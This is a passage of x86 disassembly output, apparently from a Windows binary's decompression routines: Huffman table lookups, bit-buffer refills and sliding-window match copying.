 10082bf:	89 75 ec             	mov    %esi,-0x14(%ebp)
 10082c2:	0f 8d aa 02 00 00    	jge    0x1008572
 10082c8:	8b 4d f8             	mov    -0x8(%ebp),%ecx
 10082cb:	33 f6                	xor    %esi,%esi
 10082cd:	c1 e9 16             	shr    $0x16,%ecx
 10082d0:	46                   	inc    %esi
 10082d1:	81 f9 00 04 00 00    	cmp    $0x400,%ecx
 10082d7:	73 07                	jae    0x10082e0
 10082d9:	0f bf 5c 4a 18       	movswl 0x18(%edx,%ecx,2),%ebx
 10082de:	eb 08                	jmp    0x10082e8
 10082e0:	89 b2 bc 2e 00 00    	mov    %esi,0x2ebc(%edx)
 10082e6:	33 db                	xor    %ebx,%ebx
 10082e8:	85 db                	test   %ebx,%ebx
 10082ea:	7d 47                	jge    0x1008333
 10082ec:	b9 00 00 20 00       	mov    $0x200000,%ecx
 10082f1:	8b 7d f8             	mov    -0x8(%ebp),%edi
 10082f4:	f7 db                	neg    %ebx
 10082f6:	85 cf                	test   %ecx,%edi
 10082f8:	74 16                	je     0x1008310
 10082fa:	8d 7c 1b 01          	lea    0x1(%ebx,%ebx,1),%edi
 10082fe:	81 ff 80 0a 00 00    	cmp    $0xa80,%edi
 1008304:	73 1f                	jae    0x1008325
 1008306:	0f bf 9c 9a 3e 0e 00 	movswl 0xe3e(%edx,%ebx,4),%ebx
 100830d:	00 
 100830e:	eb 1d                	jmp    0x100832d
 1008310:	8d 3c 1b             	lea    (%ebx,%ebx,1),%edi
 1008313:	81 ff 80 0a 00 00    	cmp    $0xa80,%edi
 1008319:	73 0a                	jae    0x1008325
 100831b:	0f bf 9c 9a 3c 0e 00 	movswl 0xe3c(%edx,%ebx,4),%ebx
 1008322:	00 
 1008323:	eb 08                	jmp    0x100832d
 1008325:	33 db                	xor    %ebx,%ebx
 1008327:	89 b2 bc 2e 00 00    	mov    %esi,0x2ebc(%edx)
 100832d:	d1 e9                	shr    $1,%ecx
 100832f:	85 db                	test   %ebx,%ebx
 1008331:	7c be                	jl     0x10082f1
 1008333:	83 ba bc 2e 00 00 00 	cmpl   $0x0,0x2ebc(%edx)
 100833a:	75 46                	jne    0x1008382
 100833c:	8b 4d f0             	mov    -0x10(%ebp),%ecx
 100833f:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
 1008342:	0f 83 4b 02 00 00    	jae    0x1008593
 1008348:	8a 8c 13 18 0a 00 00 	mov    0xa18(%ebx,%edx,1),%cl
 100834f:	d3 65 f8             	shll   %cl,-0x8(%ebp)
 1008352:	2a c1                	sub    %cl,%al
 1008354:	84 c0                	test   %al,%al
 1008356:	88 45 ff             	mov    %al,-0x1(%ebp)
 1008359:	7f 27                	jg     0x1008382
 100835b:	8b 75 f4             	mov    -0xc(%ebp),%esi
 100835e:	33 c9                	xor    %ecx,%ecx
 1008360:	8a 6e 01             	mov    0x1(%esi),%ch
 1008363:	83 45 f4 02          	addl   $0x2,-0xc(%ebp)
 1008367:	8a 0e                	mov    (%esi),%cl
 1008369:	89 4d 0c             	mov    %ecx,0xc(%ebp)
 100836c:	33 c9                	xor    %ecx,%ecx
 100836e:	8a c8                	mov    %al,%cl
 1008370:	8b 45 0c             	mov    0xc(%ebp),%eax
 1008373:	f7 d9                	neg    %ecx
 1008375:	d3 e0                	shl    %cl,%eax
 1008377:	09 45 f8             	or     %eax,-0x8(%ebp)
 100837a:	8a 45 ff             	mov    -0x1(%ebp),%al
 100837d:	04 10                	add    $0x10,%al
 100837f:	88 45 ff             	mov    %al,-0x1(%ebp)
 1008382:	be 00 01 00 00       	mov    $0x100,%esi
 1008387:	2b de                	sub    %esi,%ebx
 1008389:	79 19                	jns    0x10083a4
 100838b:	8b 4d 08             	mov    0x8(%ebp),%ecx
 100838e:	8b 32                	mov    (%edx),%esi
 1008390:	88 1c 31             	mov    %bl,(%ecx,%esi,1)
 1008393:	8b 72 04             	mov    0x4(%edx),%esi
 1008396:	03 32                	add    (%edx),%esi
 1008398:	88 1c 0e             	mov    %bl,(%esi,%ecx,1)
 100839b:	41                   	inc    %ecx
 100839c:	89 4d 08             	mov    %ecx,0x8(%ebp)
 100839f:	e9 c2 01 00 00       	jmp    0x1008566
 10083a4:	8b fb                	mov    %ebx,%edi
 10083a6:	83 e7 07             	and    $0x7,%edi
 10083a9:	83 ff 07             	cmp    $0x7,%edi
 10083ac:	0f 85 ca 00 00 00    	jne    0x100847c
 10083b2:	8b 4d f8             	mov    -0x8(%ebp),%ecx
 10083b5:	c1 e9 18             	shr    $0x18,%ecx
 10083b8:	3b ce                	cmp    %esi,%ecx
 10083ba:	73 0a                	jae    0x10083c6
 10083bc:	0f bf bc 4a 18 08 00 	movswl 0x818(%edx,%ecx,2),%edi
 10083c3:	00 
 10083c4:	eb 0c                	jmp    0x10083d2
 10083c6:	c7 82 bc 2e 00 00 01 	movl   $0x1,0x2ebc(%edx)
 10083cd:	00 00 00 
 10083d0:	33 ff                	xor    %edi,%edi
 10083d2:	85 ff                	test   %edi,%edi
 10083d4:	7d 4b                	jge    0x1008421
 10083d6:	b9 00 00 80 00       	mov    $0x800000,%ecx
 10083db:	8b 75 f8             	mov    -0x8(%ebp),%esi
 10083de:	f7 df                	neg    %edi
 10083e0:	85 ce                	test   %ecx,%esi
 10083e2:	74 16                	je     0x10083fa
 10083e4:	8d 74 3f 01          	lea    0x1(%edi,%edi,1),%esi
 10083e8:	81 fe e4 03 00 00    	cmp    $0x3e4,%esi
 10083ee:	73 1f                	jae    0x100840f
 10083f0:	0f bf bc ba 3e 23 00 	movswl 0x233e(%edx,%edi,4),%edi
 10083f7:	00 
 10083f8:	eb 21                	jmp    0x100841b
 10083fa:	8d 34 3f             	lea    (%edi,%edi,1),%esi
 10083fd:	81 fe e4 03 00 00    	cmp    $0x3e4,%esi
 1008403:	73 0a                	jae    0x100840f
 1008405:	0f bf bc ba 3c 23 00 	movswl 0x233c(%edx,%edi,4),%edi
 100840c:	00 
 100840d:	eb 0c                	jmp    0x100841b
 100840f:	33 ff                	xor    %edi,%edi
 1008411:	c7 82 bc 2e 00 00 01 	movl   $0x1,0x2ebc(%edx)
 1008418:	00 00 00 
 100841b:	d1 e9                	shr    $1,%ecx
 100841d:	85 ff                	test   %edi,%edi
 100841f:	7c ba                	jl     0x10083db
 1008421:	83 ba bc 2e 00 00 00 	cmpl   $0x0,0x2ebc(%edx)
 1008428:	75 42                	jne    0x100846c
 100842a:	8b 4d f0             	mov    -0x10(%ebp),%ecx
 100842d:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
 1008430:	0f 83 5d 01 00 00    	jae    0x1008593
 1008436:	8a 8c 17 b8 0c 00 00 	mov    0xcb8(%edi,%edx,1),%cl
 100843d:	d3 65 f8             	shll   %cl,-0x8(%ebp)
 1008440:	2a c1                	sub    %cl,%al
 1008442:	84 c0                	test   %al,%al
 1008444:	88 45 ff             	mov    %al,-0x1(%ebp)
 1008447:	7f 23                	jg     0x100846c
 1008449:	8b 75 f4             	mov    -0xc(%ebp),%esi
 100844c:	33 c9                	xor    %ecx,%ecx
 100844e:	8a 6e 01             	mov    0x1(%esi),%ch
 1008451:	83 45 f4 02          	addl   $0x2,-0xc(%ebp)
 1008455:	8a 0e                	mov    (%esi),%cl
 1008457:	89 4d 0c             	mov    %ecx,0xc(%ebp)
 100845a:	33 c9                	xor    %ecx,%ecx
 100845c:	8a c8                	mov    %al,%cl
 100845e:	8b 45 0c             	mov    0xc(%ebp),%eax
 1008461:	f7 d9                	neg    %ecx
 1008463:	d3 e0                	shl    %cl,%eax
 1008465:	09 45 f8             	or     %eax,-0x8(%ebp)
 1008468:	80 45 ff 10          	addb   $0x10,-0x1(%ebp)
 100846c:	83 c7 07             	add    $0x7,%edi
 100846f:	83 ba bc 2e 00 00 00 	cmpl   $0x0,0x2ebc(%edx)
 1008476:	0f 85 17 01 00 00    	jne    0x1008593
 100847c:	c1 fb 03             	sar    $0x3,%ebx
 100847f:	80 fb 02             	cmp    $0x2,%bl
 1008482:	0f 8e 90 00 00 00    	jle    0x1008518
 1008488:	80 fb 03             	cmp    $0x3,%bl
 100848b:	7e 7a                	jle    0x1008507
 100848d:	8b 75 f8             	mov    -0x8(%ebp),%esi
 1008490:	0f be db             	movsbl %bl,%ebx
 1008493:	0f b6 83 f0 25 00 01 	movzbl 0x10025f0(%ebx),%eax
 100849a:	6a 20                	push   $0x20
 100849c:	59                   	pop    %ecx
 100849d:	2b c8                	sub    %eax,%ecx
 100849f:	d3 ee                	shr    %cl,%esi
 10084a1:	8b c8                	mov    %eax,%ecx
 10084a3:	8a 83 f0 25 00 01    	mov    0x10025f0(%ebx),%al
 10084a9:	28 45 ff             	sub    %al,-0x1(%ebp)
 10084ac:	d3 65 f8             	shll   %cl,-0x8(%ebp)
 10084af:	80 7d ff 00          	cmpb   $0x0,-0x1(%ebp)
 10084b3:	7f 49                	jg     0x10084fe
 10084b5:	33 c0                	xor    %eax,%eax
 10084b7:	8b c8                	mov    %eax,%ecx
 10084b9:	8b 45 f4             	mov    -0xc(%ebp),%eax
 10084bc:	8a 68 01             	mov    0x1(%eax),%ch
 10084bf:	8a 08                	mov    (%eax),%cl
 10084c1:	8b c1                	mov    %ecx,%eax
 10084c3:	33 c9                	xor    %ecx,%ecx
 10084c5:	8a 4d ff             	mov    -0x1(%ebp),%cl
 10084c8:	80 45 ff 10          	addb   $0x10,-0x1(%ebp)
 10084cc:	f7 d9                	neg    %ecx
 10084ce:	d3 e0                	shl    %cl,%eax
 10084d0:	09 45 f8             	or     %eax,-0x8(%ebp)
 10084d3:	8b 45 f4             	mov    -0xc(%ebp),%eax
 10084d6:	40                   	inc    %eax
 10084d7:	40                   	inc    %eax
 10084d8:	80 7d ff 00          	cmpb   $0x0,-0x1(%ebp)
 10084dc:	89 45 f4             	mov    %eax,-0xc(%ebp)
 10084df:	7f 1d                	jg     0x10084fe
 10084e1:	33 c9                	xor    %ecx,%ecx
 10084e3:	8a 68 01             	mov    0x1(%eax),%ch
 10084e6:	83 45 f4 02          	addl   $0x2,-0xc(%ebp)
 10084ea:	8a 08                	mov    (%eax),%cl
 10084ec:	8b c1                	mov    %ecx,%eax
 10084ee:	33 c9                	xor    %ecx,%ecx
 10084f0:	8a 4d ff             	mov    -0x1(%ebp),%cl
 10084f3:	f7 d9                	neg    %ecx
 10084f5:	d3 e0                	shl    %cl,%eax
 10084f7:	09 45 f8             	or     %eax,-0x8(%ebp)
 10084fa:	80 45 ff 10          	addb   $0x10,-0x1(%ebp)
 10084fe:	03 34 9d 28 26 00 01 	add    0x1002628(,%ebx,4),%esi
 1008505:	eb 03                	jmp    0x100850a
 1008507:	33 f6                	xor    %esi,%esi
 1008509:	46                   	inc    %esi
 100850a:	8b 42 10             	mov    0x10(%edx),%eax
 100850d:	89 42 14             	mov    %eax,0x14(%edx)
 1008510:	8b 42 0c             	mov    0xc(%edx),%eax
 1008513:	89 42 10             	mov    %eax,0x10(%edx)
 1008516:	eb 12                	jmp    0x100852a
 1008518:	84 db                	test   %bl,%bl
 100851a:	0f be c3             	movsbl %bl,%eax
 100851d:	8d 4c 82 0c          	lea    0xc(%edx,%eax,4),%ecx
 1008521:	8b 31                	mov    (%ecx),%esi
 1008523:	74 08                	je     0x100852d
 1008525:	8b 42 0c             	mov    0xc(%edx),%eax
 1008528:	89 01                	mov    %eax,(%ecx)
 100852a:	89 72 0c             	mov    %esi,0xc(%edx)
 100852d:	8b 4d 08             	mov    0x8(%ebp),%ecx
 1008530:	47                   	inc    %edi
 1008531:	47                   	inc    %edi
 1008532:	2b ce                	sub    %esi,%ecx
 1008534:	8b 02                	mov    (%edx),%eax
 1008536:	8b f1                	mov    %ecx,%esi
 1008538:	23 72 08             	and    0x8(%edx),%esi
 100853b:	8a 1c 06             	mov    (%esi,%eax,1),%bl
 100853e:	8b 75 08             	mov    0x8(%ebp),%esi
 1008541:	81 fe 01 01 00 00    	cmp    $0x101,%esi
 1008547:	88 1c 30             	mov    %bl,(%eax,%esi,1)
 100854a:	7d 0d                	jge    0x1008559
 100854c:	8b 02                	mov    (%edx),%eax
 100854e:	8b 5a 04             	mov    0x4(%edx),%ebx
 1008551:	03 d8                	add    %eax,%ebx
 1008553:	8a 04 30             	mov    (%eax,%esi,1),%al
 1008556:	88 04 33             	mov    %al,(%ebx,%esi,1)
 1008559:	46                   	inc    %esi
 100855a:	41                   	inc    %ecx
 100855b:	4f                   	dec    %edi
 100855c:	85 ff                	test   %edi,%edi
 100855e:	89 75 08             	mov    %esi,0x8(%ebp)
 1008561:	7f d1                	jg     0x1008534
 1008563:	8a 45 ff             	mov    -0x1(%ebp),%al
 1008566:	8b 4d 08             	mov    0x8(%ebp),%ecx
 1008569:	3b 4d ec             	cmp    -0x14(%ebp),%ecx
 100856c:	0f 8c 56 fd ff ff    	jl     0x10082c8
 1008572:	88 82 b4 2e 00 00    	mov    %al,0x2eb4(%edx)
 1008578:	8b 45 f8             	mov    -0x8(%ebp),%eax
 100857b:	89 82 b0 2e 00 00    	mov    %eax,0x2eb0(%edx)
 1008581:	8b 45 f4             	mov    -0xc(%ebp),%eax
 1008584:	89 82 04 2b 00 00    	mov    %eax,0x2b04(%edx)
 100858a:	8b c1                	mov    %ecx,%eax
 100858c:	5f                   	pop    %edi
 100858d:	5e                   	pop    %esi
 100858e:	5b                   	pop    %ebx
 100858f:	c9                   	leave
 1008590:	c2 08 00             	ret    $0x8
 1008593:	83 c8 ff             	or     $0xffffffff,%eax
 1008596:	eb f4                	jmp    0x100858c
 1008598:	cc                   	int3
 1008599:	cc                   	int3
 100859a:	cc                   	int3
 100859b:	cc                   	int3
 100859c:	cc                   	int3
 100859d:	8b ff                	mov    %edi,%edi
 100859f:	55                   	push   %ebp
 10085a0:	8b ec                	mov    %esp,%ebp
 10085a2:	83 ec 14             	sub    $0x14,%esp
 10085a5:	8b 55 08             	mov    0x8(%ebp),%edx
 10085a8:	8a 82 b4 2e 00 00    	mov    0x2eb4(%edx),%al
 10085ae:	8b 8a b0 2e 00 00    	mov    0x2eb0(%edx),%ecx
 10085b4:	53                   	push   %ebx
 10085b5:	8b 9a 04 2b 00 00    	mov    0x2b04(%edx),%ebx
 10085bb:	88 45 0b             	mov    %al,0xb(%ebp)
 10085be:	8b 82 08 2b 00 00    	mov    0x2b08(%edx),%eax
 10085c4:	56                   	push   %esi
 10085c5:	8b 75 10             	mov    0x10(%ebp),%esi
 10085c8:	89 45 f0             	mov    %eax,-0x10(%ebp)
 10085cb:	8b 45 0c             	mov    0xc(%ebp),%eax
 10085ce:	03 f0                	add    %eax,%esi
 10085d0:	3b c6                	cmp    %esi,%eax
 10085d2:	57                   	push   %edi
 10085d3:	89 4d fc             	mov    %ecx,-0x4(%ebp)
 10085d6:	89 5d f4             	mov    %ebx,-0xc(%ebp)
 10085d9:	89 75 ec             	mov    %esi,-0x14(%ebp)
 10085dc:	0f 8d 9b 02 00 00    	jge    0x100887d
 10085e2:	33 f6                	xor    %esi,%esi
 10085e4:	46                   	inc    %esi
 10085e5:	eb 03                	jmp    0x10085ea
 10085e7:	8b 4d fc             	mov    -0x4(%ebp),%ecx
 10085ea:	8b c1                	mov    %ecx,%eax
 10085ec:	c1 e8 16             	shr    $0x16,%eax
 10085ef:	3d 00 04 00 00       	cmp    $0x400,%eax
 10085f4:	73 07                	jae    0x10085fd
 10085f6:	0f bf 7c 42 18       	movswl 0x18(%edx,%eax,2),%edi
 10085fb:	eb 08                	jmp    0x1008605
 10085fd:	89 b2 bc 2e 00 00    	mov    %esi,0x2ebc(%edx)
 1008603:	33 ff                	xor    %edi,%edi
 1008605:	85 ff                	test   %edi,%edi
 1008607:	89 7d f8             	mov    %edi,-0x8(%ebp)
 100860a:	7d 49                	jge    0x1008655
 100860c:	c7 45 10 00 00 20 00 	movl   $0x200000,0x10(%ebp)
 1008613:	f7 df                	neg    %edi
 1008615:	85 4d 10             	test   %ecx,0x10(%ebp)
 1008618:	74 15                	je     0x100862f
 100861a:	8d 44 3f 01          	lea    0x1(%edi,%edi,1),%eax
 100861e:	3d 80 0a 00 00       	cmp    $0xa80,%eax
 1008623:	73 1e                	jae    0x1008643
 1008625:	0f bf bc ba 3e 0e 00 	movswl 0xe3e(%edx,%edi,4),%edi
 100862c:	00 
 100862d:	eb 1c                	jmp    0x100864b
 100862f:	8d 04 3f             	lea    (%edi,%edi,1),%eax
 1008632:	3d 80 0a 00 00       	cmp    $0xa80,%eax
 1008637:	73 0a                	jae    0x1008643
 1008639:	0f bf bc ba 3c 0e 00 	movswl 0xe3c(%edx,%edi,4),%edi
 1008640:	00 
 1008641:	eb 08                	jmp    0x100864b
 1008643:	33 ff                	xor    %edi,%edi
 1008645:	89 b2 bc 2e 00 00    	mov    %esi,0x2ebc(%edx)
 100864b:	d1 6d 10             	shrl   $1,0x10(%ebp)
 100864e:	85 ff                	test   %edi,%edi
 1008650:	7c c1                	jl     0x1008613
 1008652:	89 7d f8             	mov    %edi,-0x8(%ebp)
 1008655:	83 ba bc 2e 00 00 00 	cmpl   $0x0,0x2ebc(%edx)
 100865c:	0f 85 48 02 00 00    	jne    0x10088aa
 1008662:	3b 5d f0             	cmp    -0x10(%ebp),%ebx
 1008665:	0f 83 3f 02 00 00    	jae    0x10088aa
 100866b:	8a 8c 17 18 0a 00 00 	mov    0xa18(%edi,%edx,1),%cl
 1008672:	8a 45 0b             	mov    0xb(%ebp),%al
 1008675:	d3 65 fc             	shll   %cl,-0x4(%ebp)
 1008678:	2a c1                	sub    %cl,%al
 100867a:	84 c0                	test   %al,%al
 100867c:	88 4d 13             	mov    %cl,0x13(%ebp)
 100867f:	88 45 0b             	mov    %al,0xb(%ebp)
 1008682:	7f 25                	jg     0x10086a9
 1008684:	33 c9                	xor    %ecx,%ecx
 1008686:	8a 6b 01             	mov    0x1(%ebx),%ch
 1008689:	8a 0b                	mov    (%ebx),%cl
 100868b:	89 4d 10             	mov    %ecx,0x10(%ebp)
 100868e:	33 c9                	xor    %ecx,%ecx
 1008690:	8a c8                	mov    %al,%cl
 1008692:	8b 45 10             	mov    0x10(%ebp),%eax
 1008695:	f7 d9                	neg    %ecx
 1008697:	d3 e0                	shl    %cl,%eax
 1008699:	09 45 fc             	or     %eax,-0x4(%ebp)
 100869c:	8a 45 0b             	mov    0xb(%ebp),%al
 100869f:	43                   	inc    %ebx
 10086a0:	43                   	inc    %ebx
 10086a1:	04 10                	add    $0x10,%al
 10086a3:	89 5d f4             	mov    %ebx,-0xc(%ebp)
 10086a6:	88 45 0b             	mov    %al,0xb(%ebp)
 10086a9:	81 6d f8 00 01 00 00 	subl   $0x100,-0x8(%ebp)
 10086b0:	79 17                	jns    0x10086c9
 10086b2:	8b 0a                	mov    (%edx),%ecx
 10086b4:	8b 45 0c             	mov    0xc(%ebp),%eax
 10086b7:	89 55 10             	mov    %edx,0x10(%ebp)
 10086ba:	8a 55 f8             	mov    -0x8(%ebp),%dl
 10086bd:	88 14 08             	mov    %dl,(%eax,%ecx,1)
 10086c0:	8b 55 10             	mov    0x10(%ebp),%edx
 10086c3:	40                   	inc    %eax
 10086c4:	e9 a8 01 00 00       	jmp    0x1008871
 10086c9:	8b 7d f8             	mov    -0x8(%ebp),%edi
 10086cc:	83 e7 07             	and    $0x7,%edi
 10086cf:	83 ff 07             	cmp    $0x7,%edi
 10086d2:	0f 85 c3 00 00 00    	jne    0x100879b
 10086d8:	8b 4d fc             	mov    -0x4(%ebp),%ecx
 10086db:	c1 e9 18             	shr    $0x18,%ecx
 10086de:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
 10086e4:	73 0a                	jae    0x10086f0
 10086e6:	0f bf bc 4a 18 08 00 	movswl 0x818(%edx,%ecx,2),%edi
 10086ed:	00 
 10086ee:	eb 08                	jmp    0x10086f8
 10086f0:	89 b2 bc 2e 00 00    	mov    %esi,0x2ebc(%edx)
 10086f6:	33 ff                	xor    %edi,%edi
 10086f8:	85 ff                	test   %edi,%edi
 10086fa:	7d 49                	jge    0x1008745
 10086fc:	b9 00 00 80 00       	mov    $0x800000,%ecx
 1008701:	f7 df                	neg    %edi
 1008703:	85 4d fc             	test   %ecx,-0x4(%ebp)
 1008706:	74 16                	je     0x100871e
 1008708:	8d 74 3f 01          	lea    0x1(%edi,%edi,1),%esi
 100870c:	81 fe e4 03 00 00    	cmp    $0x3e4,%esi
 1008712:	73 1f                	jae    0x1008733
 1008714:	0f bf bc ba 3e 23 00 	movswl 0x233e(%edx,%edi,4),%edi
 100871b:	00 
 100871c:	eb 21                	jmp    0x100873f
 100871e:	8d 34 3f             	lea    (%edi,%edi,1),%esi
 1008721:	81 fe e4 03 00 00    	cmp    $0x3e4,%esi
 1008727:	73 0a                	jae    0x1008733
 1008729:	0f bf bc ba 3c 23 00 	movswl 0x233c(%edx,%edi,4),%edi
 1008730:	00 
 1008731:	eb 0c                	jmp    0x100873f
 1008733:	33 ff                	xor    %edi,%edi
 1008735:	c7 82 bc 2e 00 00 01 	movl   $0x1,0x2ebc(%edx)
 100873c:	00 00 00 
 100873f:	d1 e9                	shr    $1,%ecx
 1008741:	85 ff                	test   %edi,%edi
 1008743:	7c bc                	jl     0x1008701
 1008745:	83 ba bc 2e 00 00 00 	cmpl   $0x0,0x2ebc(%edx)
 100874c:	75 3d                	jne    0x100878b
 100874e:	3b 5d f0             	cmp    -0x10(%ebp),%ebx
 1008751:	0f 83 53 01 00 00    	jae    0x10088aa
 1008757:	8a 8c 17 b8 0c 00 00 	mov    0xcb8(%edi,%edx,1),%cl
 100875e:	d3 65 fc             	shll   %cl,-0x4(%ebp)
 1008761:	2a c1                	sub    %cl,%al
 1008763:	84 c0                	test   %al,%al
 1008765:	88 45 0b             	mov    %al,0xb(%ebp)
 1008768:	7f 21                	jg     0x100878b
 100876a:	33 c9                	xor    %ecx,%ecx
 100876c:	8a 6b 01             	mov    0x1(%ebx),%ch
 100876f:	8a 0b                	mov    (%ebx),%cl
 1008771:	89 4d 10             	mov    %ecx,0x10(%ebp)
 1008774:	33 c9                	xor    %ecx,%ecx
 1008776:	8a c8                	mov    %al,%cl
 1008778:	8b 45 10             	mov    0x10(%ebp),%eax
 100877b:	f7 d9                	neg    %ecx
 100877d:	d3 e0                	shl    %cl,%eax
 100877f:	09 45 fc             	or     %eax,-0x4(%ebp)
 1008782:	43                   	inc    %ebx
 1008783:	43                   	inc    %ebx
 1008784:	80 45 0b 10          	addb   $0x10,0xb(%ebp)
 1008788:	89 5d f4             	mov    %ebx,-0xc(%ebp)
 100878b:	83 c7 07             	add    $0x7,%edi
 100878e:	83 ba bc 2e 00 00 00 	cmpl   $0x0,0x2ebc(%edx)
 1008795:	0f 85 0f 01 00 00    	jne    0x10088aa
 100879b:	8b 4d f8             	mov    -0x8(%ebp),%ecx
 100879e:	c1 f9 03             	sar    $0x3,%ecx
 10087a1:	80 f9 02             	cmp    $0x2,%cl
 10087a4:	0f 8e 91 00 00 00    	jle    0x100883b
 10087aa:	80 f9 03             	cmp    $0x3,%cl
 10087ad:	7e 78                	jle    0x1008827
 10087af:	8b 75 fc             	mov    -0x4(%ebp),%esi
 10087b2:	0f be c1             	movsbl %cl,%eax
 10087b5:	89 45 10             	mov    %eax,0x10(%ebp)
 10087b8:	0f b6 80 f0 25 00 01 	movzbl 0x10025f0(%eax),%eax
 10087bf:	6a 20                	push   $0x20
 10087c1:	59                   	pop    %ecx
 10087c2:	2b c8                	sub    %eax,%ecx
 10087c4:	d3 ee                	shr    %cl,%esi
 10087c6:	8b c8                	mov    %eax,%ecx
 10087c8:	8b 45 10             	mov    0x10(%ebp),%eax
 10087cb:	8a 80 f0 25 00 01    	mov    0x10025f0(%eax),%al
 10087d1:	28 45 0b             	sub    %al,0xb(%ebp)
 10087d4:	d3 65 fc             	shll   %cl,-0x4(%ebp)
 10087d7:	80 7d 0b 00          	cmpb   $0x0,0xb(%ebp)
 10087db:	7f 3e                	jg     0x100881b
 10087dd:	33 c0                	xor    %eax,%eax
 10087df:	8a 63 01             	mov    0x1(%ebx),%ah
 10087e2:	33 c9                	xor    %ecx,%ecx
 10087e4:	8a 4d 0b             	mov    0xb(%ebp),%cl
 10087e7:	80 45 0b 10          	addb   $0x10,0xb(%ebp)
 10087eb:	8a 03                	mov    (%ebx),%al
 10087ed:	f7 d9                	neg    %ecx
 10087ef:	d3 e0                	shl    %cl,%eax
 10087f1:	09 45 fc             	or     %eax,-0x4(%ebp)
 10087f4:	43                   	inc    %ebx
 10087f5:	43                   	inc    %ebx
 10087f6:	80 7d 0b 00          	cmpb   $0x0,0xb(%ebp)
 10087fa:	89 5d f4             	mov    %ebx,-0xc(%ebp)
 10087fd:	7f 1c                	jg     0x100881b
 10087ff:	33 c0                	xor    %eax,%eax
 1008801:	8a 63 01             	mov    0x1(%ebx),%ah
 1008804:	33 c9                	xor    %ecx,%ecx
 1008806:	8a 4d 0b             	mov    0xb(%ebp),%cl
 1008809:	8a 03                	mov    (%ebx),%al
 100880b:	f7 d9                	neg    %ecx
 100880d:	d3 e0                	shl    %cl,%eax
 100880f:	09 45 fc             	or     %eax,-0x4(%ebp)
 1008812:	43                   	inc    %ebx
 1008813:	43                   	inc    %ebx
 1008814:	80 45 0b 10          	addb   $0x10,0xb(%ebp)
 1008818:	89 5d f4             	mov    %ebx,-0xc(%ebp)
 100881b:	8b 45 10             	mov    0x10(%ebp),%eax
 100881e:	03 34 85 28 26 00 01 	add    0x1002628(,%eax,4),%esi
 1008825:	eb 06                	jmp    0x100882d
 1008827:	8b 35 34 26 00 01    	mov    0x1002634,%esi
 100882d:	8b 42 10             	mov    0x10(%edx),%eax
 1008830:	89 42 14             	mov    %eax,0x14(%edx)
 1008833:	8b 42 0c             	mov    0xc(%edx),%eax
 1008836:	89 42 10             	mov    %eax,0x10(%edx)
 1008839:	eb 12                	jmp    0x100884d
 100883b:	84 c9                	test   %cl,%cl
 100883d:	0f be c1             	movsbl %cl,%eax
 1008840:	8d 44 82 0c          	lea    0xc(%edx,%eax,4),%eax
 1008844:	8b 30                	mov    (%eax),%esi
 1008846:	74 08                	je     0x1008850
 1008848:	8b 4a 0c             	mov    0xc(%edx),%ecx
 100884b:	89 08                	mov    %ecx,(%eax)
 100884d:	89 72 0c             	mov    %esi,0xc(%edx)
 1008850:	8b 45 0c             	mov    0xc(%ebp),%eax
 1008853:	47                   	inc    %edi
 1008854:	8b c8                	mov    %eax,%ecx
 1008856:	2b ce                	sub    %esi,%ecx
 1008858:	47                   	inc    %edi
 1008859:	23 4a 08             	and    0x8(%edx),%ecx
 100885c:	8b 32                	mov    (%edx),%esi
 100885e:	8a 1c 0e             	mov    (%esi,%ecx,1),%bl
 1008861:	88 1c 06             	mov    %bl,(%esi,%eax,1)
 1008864:	40                   	inc    %eax
 1008865:	41                   	inc    %ecx
 1008866:	4f                   	dec    %edi
 1008867:	85 ff                	test   %edi,%edi
 1008869:	7f f1                	jg     0x100885c
 100886b:	8b 5d f4             	mov    -0xc(%ebp),%ebx
 100886e:	33 f6                	xor    %esi,%esi
 1008870:	46                   	inc    %esi
 1008871:	3b 45 ec             	cmp    -0x14(%ebp),%eax
 1008874:	89 45 0c             	mov    %eax,0xc(%ebp)
 1008877:	0f 8c 6a fd ff ff    	jl     0x10085e7
 100887d:	8a 4d 0b             	mov    0xb(%ebp),%cl
 1008880:	88 8a b4 2e 00 00    	mov    %cl,0x2eb4(%edx)
 1008886:	8b 4d fc             	mov    -0x4(%ebp),%ecx
 1008889:	89 8a b0 2e 00 00    	mov    %ecx,0x2eb0(%edx)
 100888f:	8b 4a 08             	mov    0x8(%edx),%ecx
 1008892:	23 c8                	and    %eax,%ecx
 1008894:	2b 45 ec             	sub    -0x14(%ebp),%eax
 1008897:	89 9a 04 2b 00 00    	mov    %ebx,0x2b04(%edx)
 100889d:	89 8a c0 2e 00 00    	mov    %ecx,0x2ec0(%edx)
 10088a3:	5f                   	pop    %edi
 10088a4:	5e                   	pop    %esi
 10088a5:	5b                   	pop    %ebx
 10088a6:	c9                   	leave
 10088a7:	c2 0c 00             	ret    $0xc
 10088aa:	83 c8 ff             	or     $0xffffffff,%eax
 10088ad:	eb f4                	jmp    0x10088a3
 10088af:	cc                   	int3
 10088b0:	cc                   	int3
 10088b1:	cc                   	int3
 10088b2:	cc                   	int3
 10088b3:	cc                   	int3
 10088b4:	8b ff                	mov    %edi,%edi
 10088b6:	55                   	push   %ebp
 10088b7:	8b ec                	mov    %esp,%ebp
 10088b9:	8b 55 08             	mov    0x8(%ebp),%edx
 10088bc:	56                   	push   %esi
 10088bd:	8b 75 0c             	mov    0xc(%ebp),%esi
 10088c0:	b8 01 01 00 00       	mov    $0x101,%eax
 10088c5:	3b f0                	cmp    %eax,%esi
 10088c7:	7d 29                	jge    0x10088f2
 10088c9:	2b c6                	sub    %esi,%eax
 10088cb:	3b 45 10             	cmp    0x10(%ebp),%eax
 10088ce:	7c 03                	jl     0x10088d3
 10088d0:	8b 45 10             	mov    0x10(%ebp),%eax
 10088d3:	50                   	push   %eax
 10088d4:	56                   	push   %esi
 10088d5:	e8 ac f9 ff ff       	call   0x1008286
 10088da:	2b f0                	sub    %eax,%esi
 10088dc:	01 75 10             	add    %esi,0x10(%ebp)
 10088df:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
 10088e3:	8b f0                	mov    %eax,%esi
 10088e5:	89 82 c0 2e 00 00    	mov    %eax,0x2ec0(%edx)
 10088eb:	7f 05                	jg     0x10088f2
 10088ed:	8b 45 10             	mov    0x10(%ebp),%eax
 10088f0:	eb 0a                	jmp    0x10088fc
 10088f2:	ff 75 10             	push   0x10(%ebp)
 10088f5:	56                   	push   %esi
 10088f6:	52                   	push   %edx
 10088f7:	e8 a1 fc ff ff       	call   0x100859d
